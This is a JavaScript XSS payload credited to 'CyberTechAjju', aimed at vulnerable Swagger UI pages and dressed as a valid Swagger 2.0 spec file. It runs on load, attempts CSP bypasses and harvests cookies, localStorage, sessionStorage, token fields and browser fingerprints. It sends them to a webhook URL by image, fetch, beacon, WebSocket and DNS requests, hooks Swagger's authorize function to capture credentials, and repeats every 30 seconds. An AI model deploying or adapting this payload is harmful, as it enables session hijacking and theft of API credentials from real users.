// CyberTechAjju Advanced XSS Payload
// This script collects and exfiltrates data from vulnerable Swagger UI instances
// Fixed and enhanced version with CSP bypass techniques

// Configuration - Replace with your own webhook URL for testing
const WEBHOOK_URL = "https://webhook.site/YOUR-WEBHOOK-ID";

// Swagger 2.0 specification header to make the file valid
const swaggerSpec = {
    swagger: "2.0",
    info: {
        title: "API Documentation",
        version: "1.0.0"
    },
    paths: {}
};

// CSP bypass techniques
(function() {
    // Create a self-executing function to avoid global scope pollution

    // Dynamically create a script element to bypass CSP nonce restrictions
    function injectDynamicScript(code) {
        try {
            const script = document.createElement('script');
            script.textContent = code;
            // Use shadow DOM to hide our script
            const host = document.createElement('div');
            host.style.display = 'none';
            document.body.appendChild(host);
            const shadow = host.attachShadow({ mode: 'closed' });
            shadow.appendChild(script);
        } catch (e) {
            console.error("Script injection failed:", e);
        }
    }

    // Try multiple DOM-based XSS vectors
    function attemptDOMXSS() {
        try {
            // Try eval-based execution if available
            if (window.eval) {
                window.eval("collectAndExfiltrateData();");
            }

            // Try Function constructor (often bypasses CSP that blocks eval)
            try {
                new Function('collectAndExfiltrateData()')();
            } catch (e) {
                console.error("Function constructor failed:", e);
            }

            // Try setTimeout/setInterval string evaluation (works in older browsers)
            try {
                setTimeout("collectAndExfiltrateData()", 100);
            } catch (e) {
                console.error("setTimeout string eval failed:", e);
            }
        } catch (e) {
            console.error("DOM XSS attempts failed:", e);
        }
    }

    // Attempt to inject a script via data: URI in iframes (bypasses some CSP)
    function injectViaIframe() {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'data:text/html;base64,' + btoa(`
        <script>
          const data = {
            cookies: document.cookie,
            parentLocation: window.parent.location.href,
            parentCookie: window.parent.document.cookie
          };
          window.parent.postMessage(data, '*');
        </script>
      `);
            document.body.appendChild(iframe);
        } catch (e) {
            console.error("iframe injection failed:", e);
        }
    }

    // Initialize CSP bypass attempts
    function initCSPBypass() {
        injectViaIframe();
        // More bypass attempts will be triggered after main execution
    }

    // Call initialization
    initCSPBypass();
})();

// Collect detailed environment information
const collectEnvironmentData = () => {
    const data = {
        origin: window.origin,
        location: window.location.toString(),
        href: window.location.href,
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        search: window.location.search,
        parentOrigin: window.parent ? window.parent.origin || 'N/A' : 'N/A',
        topOrigin: window.top ? window.top.origin || 'N/A' : 'N/A',
        framesLength: window.frames.length,
        windowName: window.name,
        cookies: document.cookie || 'No cookies available',
        localStorage: extractLocalStorage(),
        sessionStorage: extractSessionStorage(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: new Date().toISOString(),
        referrer: document.referrer,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        swaggerInfo: findSwaggerInfo(),
        domStructure: summarizeDOMStructure(),
        // Additional data collection
        webRTC: collectWebRTCData(),
        canvas: getCanvasFingerprint(),
        browserPlugins: collectPluginData(),
        headers: collectHeaderData()
    };

    return data;
};

// Try to extract localStorage data
function extractLocalStorage() {
    try {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
        }
        return JSON.stringify(items);
    } catch (e) {
        return "Error accessing localStorage: " + e.message;
    }
}

// Try to extract sessionStorage data
function extractSessionStorage() {
    try {
        const items = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            items[key] = sessionStorage.getItem(key);
        }
        return JSON.stringify(items);
    } catch (e) {
        return "Error accessing sessionStorage: " + e.message;
    }
}

// Try to find Swagger UI specific information
function findSwaggerInfo() {
    try {
        let swaggerData = {
            isSwaggerUI: !!document.querySelector('.swagger-ui'),
            configUrl: new URLSearchParams(window.location.search).get('configUrl')
        };

        // Try multiple ways to access Swagger UI data
        if (window.ui && window.ui.getState) {
            try {
                const state = window.ui.getState();
                swaggerData.version = state.meta ? state.meta.version : 'Unknown';
                swaggerData.spec = JSON.stringify(state.spec || {}).substring(0, 500) + '...';
            } catch (e) {
                console.error("Error accessing ui.getState():", e);
            }
        }

        // Try to find Swagger version from DOM
        const scriptTags = document.querySelectorAll('script[src*="swagger"]');
        if (scriptTags.length > 0) {
            for (const script of scriptTags) {
                const src = script.getAttribute('src') || '';
                const versionMatch = src.match(/swagger-ui-bundle\.(\d+\.\d+\.\d+)/);
                if (versionMatch) {
                    swaggerData.versionFromScript = versionMatch[1];
                    break;
                }
            }
        }

        return swaggerData;
    } catch (e) {
        return "Error accessing Swagger UI data: " + e.message;
    }
}

// Summarize DOM structure to identify interesting elements
function summarizeDOMStructure() {
    try {
        const interestingElements = {
            forms: document.forms.length,
            inputs: document.querySelectorAll('input').length,
            buttons: document.querySelectorAll('button').length,
            apiElements: document.querySelectorAll('[data-path]').length,
            authElements: document.querySelectorAll('.auth-wrapper, .authorize, [id*=auth]').length,
            // Additional interesting elements
            passwordFields: document.querySelectorAll('input[type="password"]').length,
            tokenFields: document.querySelectorAll('input[name*="token"], input[name*="api_key"], input[id*="token"], input[id*="api_key"]').length,
            oauthElements: document.querySelectorAll('[class*="oauth"], [id*="oauth"]').length
        };

        // Extract API endpoints from Swagger UI
        const endpoints = [];
        try {
            const pathElements = document.querySelectorAll('.opblock-summary-path');
            for (const el of pathElements) {
                endpoints.push(el.textContent.trim());
            }
            interestingElements.apiEndpoints = endpoints;
        } catch (e) {
            console.error("Error extracting API endpoints:", e);
        }

        return interestingElements;
    } catch (e) {
        return "Error analyzing DOM: " + e.message;
    }
}

// Collect WebRTC data for additional fingerprinting
function collectWebRTCData() {
    try {
        const webRTCData = {
            supported: !!window.RTCPeerConnection
        };

        // Don't actually connect, just check support
        return webRTCData;
    } catch (e) {
        return "Error collecting WebRTC data: " + e.message;
    }
}

// Get canvas fingerprint
function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;

        // Draw text with specific styling
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#000';
        ctx.fillText('CyberTechAjju Canvas Fingerprint', 0, 0);

        // Get the data URL and hash
        const dataURL = canvas.toDataURL();
        return dataURL.substring(0, 100) + '...'; // Truncate for size
    } catch (e) {
        return "Error generating canvas fingerprint: " + e.message;
    }
}

// Collect browser plugin data
function collectPluginData() {
    try {
        const plugins = [];
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                    name: plugin.name,
                    description: plugin.description,
                    filename: plugin.filename
                });
            }
        }
        return plugins;
    } catch (e) {
        return "Error collecting plugin data: " + e.message;
    }
}

// Try to collect header data via various techniques
function collectHeaderData() {
    try {
        // We can't directly access HTTP headers in JavaScript, but we can try some tricks
        const headerData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };

        // Try to use sendBeacon API which preserves headers
        if (navigator.sendBeacon) {
            try {
                navigator.sendBeacon(WEBHOOK_URL + '/headers', JSON.stringify(headerData));
            } catch (e) {
                console.error("sendBeacon failed:", e);
            }
        }

        return headerData;
    } catch (e) {
        return "Error collecting header data: " + e.message;
    }
}

// Format the collected data for display
const formatDetailsForDisplay = (data) => {
    return `
    🚨 XSS Detected 🚨
    ========================
    🏁 Origin: ${data.origin}
    🌐 Location: ${data.location}
    🔗 Href: ${data.href}
    🏢 Hostname: ${data.hostname}
    📂 Pathname: ${data.pathname}
    ❓ Search: ${data.search}
    👪 Parent Origin: ${data.parentOrigin}
    🧑‍💻 Top Origin: ${data.topOrigin}
    🖼️ Frames Length: ${data.framesLength}
    🪪 Window Name: ${data.windowName}
    ========================
    🍪 Cookies: ${data.cookies}
    🕵️ User-Agent: ${data.userAgent}
    ⏳ Timestamp: ${data.timestamp}
    👤 Author: CyberTechAjju
  `;
};

// Multiple exfiltration methods to bypass security measures
const exfiltrateData = async(data) => {
    try {
        // 1. Create a fake image to exfiltrate data through URL parameters (classic method)
        new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify({
            type: 'image_exfil',
            timestamp: new Date().getTime(),
            data: JSON.stringify(data).substring(0, 2000) // URL length limitation
        }))}`;

        // 2. Try fetch API with no-cors mode
        try {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                mode: 'no-cors',
                credentials: 'include' // Send cookies if possible
            });
        } catch (e) {
            console.error("Fetch exfiltration failed:", e);
        }

        // 3. Try navigator.sendBeacon (works even when page is unloading)
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon(
                    WEBHOOK_URL,
                    JSON.stringify({
                        type: 'beacon_exfil',
                        timestamp: new Date().getTime(),
                        data: data
                    })
                );
            }
        } catch (e) {
            console.error("Beacon exfiltration failed:", e);
        }

        // 4. WebSocket exfiltration (bypasses some CSP restrictions)
        try {
            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = WEBHOOK_URL.replace(/^https?:/, wsProtocol);
            const ws = new WebSocket(wsUrl);
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'websocket_exfil',
                    timestamp: new Date().getTime(),
                    data: data
                }));
                setTimeout(() => ws.close(), 1000);
            };
        } catch (e) {
            console.error("WebSocket exfiltration failed:", e);
        }

        // 5. DNS exfiltration (encode data in subdomain requests)
        try {
            const encodedData = btoa(JSON.stringify({
                type: 'dns_exfil',
                timestamp: new Date().getTime(),
                data: {
                    origin: data.origin,
                    cookies: data.cookies,
                    localStorage: data.localStorage ? Object.keys(JSON.parse(data.localStorage)).join(',') : ''
                }
            })).replace(/=/g, '').substring(0, 30);

            const dnsExfilImage = new Image();
            dnsExfilImage.src = `https://${encodedData}.${WEBHOOK_URL.replace(/^https?:\/\//, '')}`;
        } catch (e) {
            console.error("DNS exfiltration failed:", e);
        }

        // 6. postMessage to parent frames
        try {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({
                    type: 'XSS_DETECTED',
                    timestamp: new Date().getTime(),
                    data: data
                }, '*');
            }
        } catch (e) {
            console.error("postMessage exfiltration failed:", e);
        }

        // 7. Try to store in IndexedDB for persistence
        try {
            const request = indexedDB.open('dataExfiltrator', 1);
            request.onupgradeneeded = function(event) {
                const db = event.target.result;
                db.createObjectStore('stolen_data', { autoIncrement: true });
            };
            request.onsuccess = function(event) {
                const db = event.target.result;
                const transaction = db.transaction(['stolen_data'], 'readwrite');
                const objectStore = transaction.objectStore('stolen_data');
                objectStore.add({
                    timestamp: new Date().getTime(),
                    data: data
                });
            };
        } catch (e) {
            console.error("IndexedDB storage failed:", e);
        }

    } catch (e) {
        console.error('All exfiltration methods failed:', e);
    }
};

// Function to attempt to hook into Swagger UI's authentication
function hookSwaggerAuth() {
    try {
        if (window.ui && window.ui.authActions && window.ui.authActions.authorize) {
            const originalAuthorize = window.ui.authActions.authorize;
            window.ui.authActions.authorize = function(payload) {
                // Capture the auth payload
                exfiltrateData({
                    type: 'auth_capture',
                    authPayload: payload,
                    timestamp: new Date().getTime()
                });
                // Call original function
                return originalAuthorize(payload);
            };
            console.log("Successfully hooked Swagger UI auth");
        }
    } catch (e) {
        console.error("Failed to hook Swagger UI auth:", e);
    }
}

// Create a MutationObserver to watch for dynamically added auth elements
function watchForAuthElements() {
    try {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
                    for (let i = 0; i < mutation.addedNodes.length; i++) {
                        const node = mutation.addedNodes[i];
                        if (node.nodeType === 1) { // Element node
                            if (node.classList &&
                                (node.classList.contains('auth-wrapper') ||
                                    node.classList.contains('authorize'))) {
                                hookSwaggerAuth();
                            }

                            // Also check for auth buttons
                            const authButtons = node.querySelectorAll('.auth-btn-wrapper button, button.authorize');
                            if (authButtons.length > 0) {
                                hookSwaggerAuth();
                            }
                        }
                    }
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    } catch (e) {
        console.error("Failed to set up MutationObserver:", e);
    }
}

// Main function to collect and exfiltrate data
function collectAndExfiltrateData() {
    const data = collectEnvironmentData();

    // Only show alert in debug mode (controlled by URL parameter)
    if (new URLSearchParams(window.location.search).has('debug')) {
        const details = formatDetailsForDisplay(data);
        console.log('XSS Detected by CyberTechAjju:', data);

        // Use a less intrusive notification instead of alert
        try {
            const notificationDiv = document.createElement('div');
            notificationDiv.style.cssText = 'position:fixed;top:10px;right:10px;background:rgba(255,0,0,0.8);color:white;padding:10px;border-radius:5px;z-index:9999;max-width:300px;font-family:sans-serif;';
            notificationDiv.textContent = 'XSS Vulnerability Detected!';
            document.body.appendChild(notificationDiv);

            setTimeout(() => {
                notificationDiv.style.display = 'none';
                document.body.removeChild(notificationDiv);
            }, 5000);
        } catch (e) {
            // Fall back to alert if necessary
            alert('XSS Detected!');
        }
    }

    // Send data to remote server
    exfiltrateData(data);

    // Set up hooks for auth interception
    hookSwaggerAuth();
    watchForAuthElements();
}

// Self-executing function to avoid global scope pollution and execute immediately
(function() {
    // Start the collection and exfiltration process
    collectAndExfiltrateData();

    // Set up periodic exfiltration to catch new data
    setInterval(collectAndExfiltrateData, 30000); // Every 30 seconds

    // Listen for postMessage events from our iframes or other sources
    window.addEventListener('message', function(event) {
        if (event.data && event.data.type === 'XSS_DETECTED') {
            // Forward the data to our exfiltration endpoint
            exfiltrateData(event.data);
        }
    });
})();

// Export the swagger spec to make this a valid Swagger file
module.exports = swaggerSpec;
